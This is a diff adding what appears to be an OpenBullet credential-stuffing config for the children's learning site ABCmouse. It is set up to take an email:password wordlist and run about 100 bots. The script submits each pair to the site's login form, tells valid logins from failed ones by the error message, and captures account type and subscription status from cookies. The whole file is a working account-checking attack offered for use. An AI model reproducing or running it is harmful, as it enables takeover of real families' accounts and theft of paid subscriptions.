@@ -1,0 +1,52 @@
+[SETTINGS]
+{
+  "Name": "abcmouse",
+  "SuggestedBots": 100,
+  "LastModified": "2018-06-12T21:49:14.4137124+00:00",
+  "AdditionalInfo": "",
+  "Author": "SubAtomic",
+  "Version": "1.0.0",
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+#POST_LOGIN REQUEST POST "https://www.abcmouse.com/loginbox" AutoRedirect=TRUE 
+  CONTENT "requestedURL=&fb_user_id=&fb_access_token=&login=<USER>&pwd=<PASS>&subby.x=32&subby.y=21&subby=Login&action=process" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=FALSE 
+  KEYCHAIN Failure OR 
+    KEY "The email address or password you have entered is incorrect" 
+  KEYCHAIN Success OR 
+    KEY "<SOURCE>" DoesNotContain "The email address or password you have entered is incorrect." 
+REQUEST GET "https://www.abcmouse.com/html5/parents/parent_assessment/" AutoRedirect=FALSE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "referer: https://www.abcmouse.com/loginbox" 
+  HEADER "origin: https://www.abcmouse.com" 
+#PARSE_COOKIE PARSE "<COOKIES(analytics_info)>" LR "SUBSCRIPTION_TYPE_" "%" Recursive=FALSE -> VAR "ACCTPYECOOKIE" "" "" 
+#PARSE_ACCOUN_TYPE_INFO PARSE "<ACCTPYECOOKIE>" LR "" "" Recursive=FALSE -> CAP "ACCOUNT TYPE" "" "" 
+#PARSE_SUBSCRIPTION_INFO PARSE "<ACCTPYECOOKIE>" LR "" "" Recursive=FALSE -> CAP "SUBSCRIPTION" "" "" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=FALSE 
+  KEYCHAIN Failure OR 
+    KEY "<COOKIES(*)>" DoesNotContain "%22%3Atrue" 
+  KEYCHAIN Success OR 
+    KEY "<COOKIES(*)>" Contains "%22%3Atrue" 
